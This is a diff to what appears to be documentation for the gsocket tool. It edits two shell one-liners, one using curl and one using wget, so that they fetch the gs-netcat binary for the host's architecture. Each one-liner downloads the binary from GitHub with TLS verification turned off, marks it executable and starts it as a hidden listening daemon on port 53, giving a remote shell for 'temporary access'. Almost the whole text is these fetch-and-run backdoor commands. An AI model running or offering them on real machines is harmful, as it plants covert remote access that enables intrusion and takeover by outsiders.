@@ -171,7 +171,7 @@ Download the static binary from [https://github.com/hackerschoice/gsocket/releas
 {% highlight shell %}
 # This will not survive reboot. Temporary access only.
 killall gs; \
-curl -fsSLk -ogs https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-x86_64 \
+curl -fsSLk -ogs https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-$(uname -m) \
 && chmod 755 gs \
 && S=$(./gs -g) \
 && GS_PORT=53 GSOCKET_ARGS="-liD -s $S" ./gs \
@@ -187,7 +187,7 @@ curl -fsSLk -ogs https://github.com/hackerschoice/gsocket/releases/latest/downlo
 {% highlight shell %}
 # This will not survive reboot. Temporary access only.
 killall gs; \
-wget --no-check-certificate -qOgs https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-x86_64 \
+wget --no-check-certificate -qOgs https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-$(uname -m) \
 && chmod 755 gs \
 && S=$(./gs -g) \
 && GS_PORT=53 GSOCKET_ARGS="-liD -s $S" ./gs \
